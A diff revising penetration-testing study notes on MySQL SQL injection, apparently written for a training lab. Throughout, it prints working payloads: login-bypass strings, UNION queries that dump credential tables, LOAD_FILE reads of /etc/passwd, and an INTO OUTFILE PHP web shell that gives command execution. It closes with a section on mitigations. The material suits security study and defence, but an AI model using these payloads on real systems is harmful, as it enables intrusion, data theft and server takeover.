@@ -1,382 +1,269 @@
-# SQL INJECTION (MySQL)
+# SQL Injection Fundamentals
 
-## INTRODUCTION
+Three-tier web apps: client → application server → DBMS. HTTP requests arrive, the back-end builds SQL queries (often using user-supplied data) to fetch the response. When user input flows into the query unsanitized, an attacker can change the final query — that's SQL injection (against RDBMSes like MySQL; NoSQL injection is the MongoDB-world counterpart and a different discipline).
 
-SQLi = user input reaches a DB query unsanitized, letting you bend the query's logic instead of just filling in a value. Same family as command injection / XSS — input misinterpreted as code instead of data, just against SQL specifically.
+Anatomy of an injection: (1) escape the input bounds — usually with a `'` or `"`; (2) subvert the query — change its logic or append a new one (stacked/Union queries); (3) get output back — read it on the page, infer it, or exfiltrate out-of-band. Impact: credential/data theft, auth bypass, admin-panel access, file read/write on the back-end → web shells → full server control.
 
-To pull it off: break out of the input's expected boundary (usually a `'` or `"`), then reshape what follows into a query that still parses — either riding the original query (OR logic, comments) or bolting on an entirely new one (UNION, stacked queries).
+## Intro to Databases
 
-Impact: credential/data exfil, auth bypass, unlocking admin-only features, file read/write on the host — and from file write, webshell → full server compromise. Root cause is almost always unsanitized input plus an over-privileged DB account; both get the full treatment in Mitigating SQL Injection at the end.
+DBMS = creates, defines, hosts, manages databases. Features that matter: concurrency (many users, no corruption), consistency, security (auth + fine-grained permissions), reliability (backup/rollback), SQL. Architecture: Tier 1 client (website/GUI) → Tier 2 middleware (libraries/drivers translate interactions into DBMS operations) → Tier 3 DBMS. App server and DBMS can share a host; serious deployments separate them.
 
-## INTRO TO DATABASES
+**Relational vs non-relational:**
 
-DBMS = the layer that creates, hosts, and manages a database — relational, NoSQL, graph, key-value, all fall under this umbrella. Typical setup: client app → application/middleware layer → DBMS, often split across separate hosts once data volume matters.
+- RDBMS — schema-templateled tables (entities) linked by keys; the table relationships are the Schema. `users.id` ↔ `posts.user_id` style linking pulls all data about an element in one query. Implementations: MySQL, SQL Server, Oracle, PostgreSQL, MS Access. SQL only exists here.
+- NoSQL — no tables/rows/columns/keys/schemas; four storage models: Key-Value (JSON/XML pairs), Document-Based, Wide-Column, Graph. Scalable/flexible for unstructured data; MongoDB is the archetype.
 
-## TYPES OF DATABASES
+## Intro to MySQL
 
-Relational (RDBMS) — schema-defined tables linked by keys (MySQL, MSSQL, Oracle, PostgreSQL, MariaDB). This module's scope. Non-relational (NoSQL) — no fixed schema, four common storage shapes: key-value, document-based, wide-column, graph (MongoDB's the common one). Different injection class entirely — NoSQL injection, covered elsewhere.
-
-## INTRO TO MYSQL
-
-```bash
-mysql -u root -p                    # prompts for password — never pass it inline (-p<pass>), it lands in bash_history
-mysql -u root -h <HOST> -P 3306 -p  # remote; uppercase -P for port (lowercase -p is the password flag)
-```
-
-Statements terminate with `;`. Keywords aren't case-sensitive, database/table names are — `USE users;` works, `USE USERS;` doesn't if the DB is lowercase.
+CLI: `mysql -u root -p` (empty `-p` prompts, keeping the password out of bash history), `-h host -P 3306` for remote (capital P = port). Statements end with `;`; keywords are case-insensitive but database names are not.
 
 ```sql
 CREATE DATABASE users;
 SHOW DATABASES;
 USE users;
+
 CREATE TABLE logins (
     id INT NOT NULL AUTO_INCREMENT,
     username VARCHAR(100) UNIQUE NOT NULL,
     password VARCHAR(100) NOT NULL,
     date_of_joining DATETIME DEFAULT NOW(),
     PRIMARY KEY (id)
-);
+    );
+
 SHOW TABLES;
 DESCRIBE logins;
 ```
 
-`AUTO_INCREMENT` self-increments the id. `NOT NULL` = required field. `UNIQUE` = no duplicates. `DEFAULT` = fallback value. `PRIMARY KEY` = the column uniquely identifying each row.
+Column properties: `AUTO_INCREMENT`, `NOT NULL` (required), `UNIQUE`, `DEFAULT NOW()`, `PRIMARY KEY`.
 
-## SQL STATEMENTS
+## SQL Statements
 
 ```sql
 INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
-INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');   -- skip columns with defaults
-INSERT INTO logins(username, password) VALUES ('john','john123!'), ('tom','tom123!');   -- multi-row
+INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');
+INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');   -- multi-insert
 
 SELECT * FROM logins;
-SELECT username, password FROM logins;
+SELECT username,password FROM logins;
 
-DROP TABLE logins;    -- permanent, zero confirmation
+DROP TABLE logins;                                -- permanent, no confirmation
 
 ALTER TABLE logins ADD newColumn INT;
 ALTER TABLE logins RENAME COLUMN newColumn TO newerColumn;
 ALTER TABLE logins MODIFY newerColumn DATE;
 ALTER TABLE logins DROP newerColumn;
 
-UPDATE logins SET password = 'change_password' WHERE id > 1;   -- WHERE is mandatory or every row changes
+UPDATE logins SET password = 'change_password' WHERE id > 1;
 ```
 
-## QUERY RESULTS
+UPDATE without WHERE hits every row; skipping a NOT NULL column in INSERT errors.
+
+## Query Results
 
 ```sql
-SELECT * FROM logins ORDER BY password;              -- ascending default
-SELECT * FROM logins ORDER BY password DESC;
-SELECT * FROM logins ORDER BY password DESC, id ASC; -- secondary sort for ties
-
+SELECT * FROM logins ORDER BY password;                -- ASC default
+SELECT * FROM logins ORDER BY password DESC, id ASC;   -- multi-column sort
 SELECT * FROM logins LIMIT 2;
-SELECT * FROM logins LIMIT 1, 2;    -- offset (0-indexed), count — starts at row 2, returns 2 rows
+SELECT * FROM logins LIMIT 1, 2;                       -- offset 1 (0-indexed), return 2
 
 SELECT * FROM logins WHERE id > 1;
 SELECT * FROM logins WHERE username = 'admin';
-
-SELECT * FROM logins WHERE username LIKE 'admin%';   -- % = zero-or-more wildcard
-SELECT * FROM logins WHERE username LIKE '___';      -- _ = exactly-one wildcard, 3 = exactly 3 chars
+SELECT * FROM logins WHERE username LIKE 'admin%';     -- % = zero or more chars
+SELECT * FROM logins WHERE username LIKE '___';        -- _ = exactly one char
 ```
 
-Strings/dates need quotes, numbers don't.
+Strings/dates need quotes; numbers go bare.
 
-## SQL OPERATORS
+## SQL Operators
+
+`AND` / `OR` / `NOT` (also `&&`, `||`, `!`). MySQL truth: non-zero = true (prints 1), 0 = false. Precedence, high → low: `/ * %` → `+ -` → comparisons (`= > < <= >= != LIKE`) → `NOT` → `AND` → `OR`. AND binds before OR — the reason auth-bypass OR injections work:
 
 ```sql
-condition1 AND condition2    -- true only if both true
-condition1 OR condition2     -- true if either true
-NOT condition                -- flips it
+SELECT * FROM logins WHERE username != 'tom' AND id > 3 - 2;   -- subtraction first, then comparisons, then AND
 ```
 
-Symbol equivalents: `&&` `||` `!`. Non-zero = true, `0` = false.
+## Intro to SQL Injections
 
-Precedence (top evaluates first):
-
-```
-/ * %
-+ -
-= > < <= >= != LIKE
-NOT (!)
-AND (&&)
-OR (||)
-```
-
-Matters directly for auth-bypass payloads — `AND` binds tighter than `OR`, so in `... OR '1'='1' AND password='x'` the `AND` resolves first (false if the password's wrong), then `OR` against a true `'1'='1'` overrides it anyway.
-
-## INTRO TO SQL INJECTIONS
-
-Vulnerable pattern — raw input concatenated straight into a query string:
+PHP back-end pattern that causes the whole module:
 
 ```php
-$searchInput = $_POST['findUser'];
+$searchInput =  $_POST['findUser'];
 $query = "select * from logins where username like '%$searchInput'";
+$result = $conn->query($query);
 ```
 
-Normal input just fills the `LIKE` pattern. Inject a `'` and everything after becomes real SQL instead of search text:
+Input `1'; DROP TABLE users;` turns the query into `... like '%1'; DROP TABLE users;'` — code after the escaped quote executes as SQL. (Stacked queries after `;` don't actually work on MySQL — they do on MSSQL/PostgreSQL; MySQL needs Union and friends.) The trailing unclosed quote causes a syntax error — a real injection must leave a valid query, via comments or balanced quote counts.
 
-```
-1'; DROP TABLE users;
-```
+**SQLi taxonomy by output retrieval:**
 
-```sql
-select * from logins where username like '%1'; DROP TABLE users;'
-```
+- **In-band** — output on the page: Union Based (direct the output into a printed column) and Error Based (intentionally error and read the output from the error message).
+- **Blind** — no output: Boolean Based (conditional statement controls whether the page shows the normal response) and Time Based (`SLEEP()` delays the response when the condition is true).
+- **Out-of-band** — no direct access at all: exfiltrate to a remote location (e.g. DNS) and read it there.
 
-A trailing unmatched quote = syntax error unless accounted for — comments, or keeping the quote count even (next two sections). Note: stacked queries via `;` don't actually run on stock MySQL — this example's illustrative. MSSQL and PostgreSQL support them natively; MySQL needs a different route entirely.
+This module covers Union Based.
 
-**Types, by how output comes back:**
+## Subverting Query Logic
 
-```
-In-band     — shows directly in the response
-  Union-based   extend the query, land results in a printed column
-  Error-based   force a DB error that carries data in its message
-Blind       — no direct output, infer bit-by-bit
-  Boolean-based page behavior differs on TRUE vs FALSE
-  Time-based    response delay (SLEEP()) signals TRUE
-Out-of-band — exfil via a side channel (DNS etc.) when nothing else works
-```
+Target: `SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';`
 
-This module's focus: Union-based.
+**Discovery first** — probe with `'` `"` `#` `;` `)` (URL-encoded `%27 %22 %23 %3B %29` when injected into a GET URL). A SQL syntax error instead of "login failed" = likely vulnerable.
 
-## SUBVERTING QUERY LOGIC
-
-Discovery — throw these at any field, watch for behavior change or an error:
-
-```
-'   %27
-"   %22
-#   %23
-;   %3B
-)   %29
-```
-
-URL-encode when it's riding a GET request.
-
-Vulnerable login:
-
-```sql
-SELECT * FROM logins WHERE username='admin' AND password='p@ssw0rd';
-```
-
-Single quote breaks it (odd quote count → syntax error) — close it with a comment, or keep the count even.
-
-**OR-based auth bypass** — abuse `AND` > `OR` precedence: inject a condition that's always true, paired with `OR`, and the whole clause resolves true regardless of the real password.
-
-```
-admin' or '1'='1
-```
+**OR injection** — make the WHERE always true. `admin' or '1'='1` as the username gives:
 
 ```sql
 SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'something';
 ```
 
-`AND` evaluates first (false if password's wrong) but `OR` against a known-true condition overrides it anyway. Works without knowing a valid username too — same trick in the password field:
+AND evaluates first (`'1'='1' AND password='something'` → false), then OR — but `username='admin'` alone carries the query to true. Note the dropped final quote in the payload: the original query's closing quote fills the slot, keeping the count even. With an unknown username, inject the OR on the password side too — `' or '1' = '1` in both fields logs in as the first user in the table regardless of credentials. PayloadAllTheThings keeps a comprehensive auth-bypass payload list keyed to query shapes.
 
-```
-' or '1'='1
-```
+## Using Comments
 
-true regardless of what's in either field. Full bypass payload list: PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings) — different payloads fit different query shapes.
+MySQL comments: `-- ` (two dashes **plus a space**; URL-encoded as `--+` since + = space; the module writes `-- -` to show the space), `#` (`%23` in URLs — browsers treat raw `#` as a fragment), and in-line `/**/`.
 
-## USING COMMENTS
-
-```
--- <space>   line comment — needs the trailing space or it won't parse; URL-encoded as --+ or written -- - to make the space visible
-#            line comment — in a browser URL, encode as %23 or it's treated as a page fragment and never reaches the server
-```
-
-Comment out everything after your injection instead of needing a balanced query:
-
-```
-admin'--
-```
+`admin'-- ` as the username:
 
 ```sql
 SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
 ```
 
-Password condition never evaluates — in as admin on username alone.
+Everything after the comment vanishes — password check gone, syntax guaranteed clean.
 
-Parenthesis-wrapped conditions need matching closure:
+**Parenthesis case:** query shaped `WHERE (username='admin' AND id > 1) AND password='<md5>'` (password hashed client-side before the query, so that field is uninjectable). `admin'-- ` fails — unclosed parenthesis. Close it in the payload: `admin')-- ` → `WHERE (username='admin')` → logged in.
 
-```sql
-SELECT * FROM logins WHERE (username='admin' AND id > 1) AND password='<hash>';
-```
+## Union Clause
 
-`admin'--` alone breaks on the unclosed paren — close it first:
+UNION merges results of multiple SELECTs — one injection to dump data from any table/database. Constraints: equal column counts on both sides (`ERROR 1222` otherwise) and matching column data types.
 
-```
-admin')--
-```
+Uneven columns → pad with junk: numbers (`SELECT 1,2,3,4`) work and double as position markers; strings work; `NULL` fits every type (the advanced choice).
 
 ```sql
-SELECT * FROM logins WHERE (username='admin')
+SELECT * from products where product_id = '1' UNION SELECT username, 2, 3, 4 from passwords-- '
 ```
 
-## UNION CLAUSE
+## Union Injection
 
-`UNION` merges results from two SELECTs into one output — the core mechanic for pulling data from tables you were never meant to touch.
+Workflow against `search.php?port_code=cn` (a `'` throws a SQL error → vulnerable, and output is visible → Union-based applies):
+
+**1. Column count** — two methods:
 
 ```sql
-SELECT * FROM ports UNION SELECT * FROM ships;
+' order by 1-- -        -- increment until "Unknown column '5' in 'order clause'" → 4 columns
+cn' UNION select 1,2,3-- -      -- errors until the count matches; 1,2,3,4 succeeds
 ```
 
-Hard requirement: matching column count both sides, compatible-enough types per position, or MySQL throws a column-count error.
+ORDER BY: works until it errors. UNION: errors until it works. Either answer: 4 columns.
 
-Mismatch workaround — pad with junk to match:
+**2. Injection location** — not every column is printed (IDs usually aren't). `cn' UNION select 1,2,3,4-- -` shows which numbers come back (module case: 2, 3, 4 printed; column 1 invisible). Put real queries only in printed positions. Confirm with a data-bearing test:
 
 ```sql
-SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords
+cn' UNION select 1,@@version,3,4-- -     -- → 10.3.22-MariaDB-1ubuntu1
 ```
 
-Numbers as filler double as positional markers, so once it renders you know which junk value maps to which output column. `NULL` is the safer universal filler once past initial recon — fits every data type.
+## Database Enumeration
 
-## UNION INJECTION
+**Fingerprint the DBMS** (guides which queries work). Hint first: Apache/Nginx → probably Linux → probably MySQL; IIS → probably MSSQL. Then confirm — MySQL probes by output situation:
 
-**Find column count** — two methods:
+| Payload | Situation | MySQL result |
+|---|---|---|
+| `SELECT @@version` | full query output | version string (e.g. `10.3.22-MariaDB-1ubuntu1`) |
+| `SELECT POW(1,1)` | numeric output only | `1` |
+| `SELECT SLEEP(5)` | blind/no output | 5-second delay |
 
-`ORDER BY` — climb until it errors (that column number doesn't exist → count = last one that worked):
+**INFORMATION_SCHEMA** — metadata database holding every database, table, and column. Cross-database references use the dot operator: `SELECT * FROM my_database.users;`
 
-```
-' order by 1-- -
-' order by 2-- -
-...
-' order by 5-- -   → "Unknown column '5'" → table has 4 columns
-```
-
-`UNION` — climb until it stops erroring:
-
-```
-' UNION select 1,2,3-- -      → column-count mismatch error
-' UNION select 1,2,3,4-- -    → works → 4 columns
-```
-
-**Find which columns print** — not every selected column reaches the page. Swap a number for `@@version` in each position, see which one renders real output instead of staying blank or showing the raw junk value — that position is your usable injection point going forward.
-
-```
-cn' UNION select 1,@@version,3,4-- -
-```
-
-## DATABASE ENUMERATION
-
-**Fingerprint the DBMS first** — different DBMS, different dialect:
-
-```
-SELECT @@version    full output available   → version string, confirms MySQL/MariaDB
-SELECT POW(1,1)     numeric-only output     → returns 1, errors on other DBMS
-SELECT SLEEP(5)     blind/no output         → 5s delay confirms MySQL specifically
-```
-
-**INFORMATION_SCHEMA** — metadata DB, holds every DB/table/column name on the server. Cross-DB reference needs the dot operator: `<db>.<table>`.
+Enumeration chain (each step is a UNION payload in a printed column):
 
 ```sql
--- list every DB (skip mysql, information_schema, performance_schema, sometimes sys — always present, never the target)
+-- databases (ignore mysql/information_schema/performance_schema/sys defaults)
 cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -
 
--- current DB the app's actually running against
+-- current database
 cn' UNION select 1,database(),2,3-- -
 
--- tables inside a specific DB
-cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='<DB>'-- -
+-- tables in a target database
+cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -
 
--- columns inside a specific table
-cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='<TABLE>'-- -
+-- columns of a target table
+cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -
 
--- dump the data — dot operator for cross-DB reference
-cn' UNION select 1, username, password, 4 from <DB>.<TABLE>-- -
+-- dump the data (dot operator — the app runs in ilfreight, the table lives in dev)
+cn' UNION select 1, username, password, 4 from dev.credentials-- -
 ```
 
-## READING FILES
+Result shape: schema names → `ilfreight` (current) + `dev` (interesting); dev holds credentials/framework/pages/posts; credentials has username/password; the dump yields creds, hashes, an API key.
 
-Needs the `FILE` privilege specifically — DBA doesn't automatically include it, check directly.
+## Reading Files
+
+File ops need the **FILE** privilege. Enumerate first:
 
 ```sql
-cn' UNION SELECT 1, user(), 3, 4-- -                                              -- current DB user
-cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user='root'-- -        -- Y = superuser
-cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -   -- full privilege list, look for FILE
+cn' UNION SELECT 1, user(), 3, 4-- -                                   -- who are we? root@localhost
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -   -- Y = superuser
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -
 ```
 
-With `FILE` confirmed:
+FILE in the list → read with `LOAD_FILE()` (also needs the OS user running MySQL to have read rights on the file):
 
 ```sql
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -
+cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -    -- leaks app source; Ctrl+U to view since HTML renders
 ```
 
-Read also needs the OS user running MySQL to have OS-level read rights on that specific file — DB privilege alone isn't sufficient. Source disclosure works the same way — read the vulnerable page's own file, `CTRL+U` to view raw if the browser tries to render it as HTML instead of dumping text:
+## Writing Files
+
+Three requirements: FILE privilege, `secure_file_priv` not blocking, and OS write access to the target path. Check the variable via INFORMATION_SCHEMA (`SHOW VARIABLES` doesn't fit a UNION):
 
 ```sql
-cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
 ```
 
-## WRITING FILES
+Values: empty = read/write anywhere (MariaDB default — the good case); a path = restricted to it (MySQL default `/var/lib/mysql-files`); NULL = no file ops anywhere (some modern configs).
 
-Three requirements, all mandatory: `FILE` privilege, `secure_file_priv` not locked down, OS-level write access to the target directory.
-
-`secure_file_priv` meaning: empty = read/write anywhere, a set path = restricted to that directory only (MySQL defaults to `/var/lib/mysql-files`), `NULL` = disabled entirely (some hardened configs). MariaDB defaults to empty.
-
-```sql
-cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name='secure_file_priv'-- -
-```
-
-Write:
+`SELECT ... INTO OUTFILE` writes query results, and strings write directly:
 
 ```sql
 SELECT * from users INTO OUTFILE '/tmp/credentials';
 SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -
 ```
 
-`FROM_BASE64('<DATA>')` for long or binary content that a plain string literal can't carry cleanly.
+No page error = likely written; browse to the file to confirm (junk columns land in the file — use `""` instead of numbers for clean output; `FROM_BASE64("...")` handles long/binary writes).
 
-Need the webroot to write anywhere useful — `LOAD_FILE` the server config to confirm it (`/etc/apache2/apache2.conf`, `/etc/nginx/nginx.conf`, `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config` for IIS), fuzz common webroot paths if config's unreadable, or read server error messages for path hints as a last resort.
-
-Webshell:
+**Web shell:**
 
 ```sql
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -
 ```
 
-```
-http://<TARGET_IP>:<PORT>/shell.php?0=id
-```
-
-`""` instead of numbers as filler on write payloads — numbers land in the output file as literal junk characters wrapped around your actual content, `""` keeps it clean.
-
-## MITIGATING SQL INJECTION
-
-**Input sanitization** — escape special characters before they reach the query:
-
-```php
-$username = mysqli_real_escape_string($conn, $_POST['username']);
+```text
+http://SERVER_IP:PORT/shell.php?0=id
+→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-PostgreSQL equivalent: `pg_escape_string()`.
+Web root discovery when unknown: `LOAD_FILE` the server config (`/etc/apache2/apache2.conf`, `/etc/nginx/nginx.conf`, IIS `%WinDir%\System32\Inetsrv\Config\ApplicationHost.config`), fuzz candidate web roots with dedicated wordlists, or mine server errors.
 
-**Input validation** — restrict to the expected format, reject anything else:
+## Mitigating SQL Injection
 
-```php
-$pattern = "/^[A-Za-z\s]+$/";
-if(!preg_match($pattern, $code)) { die("Invalid input!"); }
-```
-
-**Least privilege** — the account the app authenticates as should never be root/admin-equivalent:
+- **Input sanitization** — `mysqli_real_escape_string($conn, $_POST['username'])` escapes `'` and `"` (pg_escape_string for PostgreSQL).
+- **Input validation** — whitelist shape: port codes are letters/spaces → `preg_match("/^[A-Za-z\s]+$/", $code)` or die.
+- **User privileges** — least privilege DB users; never superusers for web apps:
 
 ```sql
 CREATE USER 'reader'@'localhost';
-GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY '<PASSWORD>';
+GRANT SELECT ON ilfreight.ports TO 'reader'@'localhost' IDENTIFIED BY 'p@ssw0Rd!!';
 ```
 
-Confirmed in practice — that user queries its one allowed table fine, gets denied on everything else, including other tables in its own database.
+The reader user then sees only its table and its database in INFORMATION_SCHEMA; other tables error with permission denied.
 
-**WAF** — catches common injection markers even when app logic itself is flawed (`INFORMATION_SCHEMA` is a classic auto-blocked string). ModSecurity (open-source), Cloudflare (managed), etc.
-
-**Parameterized queries** — the actual fix, not a patch on string concatenation. Placeholders get bound and escaped by the driver itself instead of being spliced into the query:
+- **WAF** — ModSecurity/Cloudflare-style request filtering (e.g. drop anything containing `INFORMATION_SCHEMA`).
+- **Parameterized queries** — placeholders, never concatenation:
 
 ```php
-$query = "SELECT * FROM logins WHERE username=? AND password=?";
+$query = "SELECT * FROM logins WHERE username=? AND password = ?";
 $stmt = mysqli_prepare($conn, $query);
 mysqli_stmt_bind_param($stmt, 'ss', $username, $password);
 mysqli_stmt_execute($stmt);
 ```
 
-Same concept holds across every language/driver with prepared-statement support — this one's PHP/mysqli, but it ports directly.
+None of these is absolute — application logic can still be injectable — and the principles port beyond PHP.
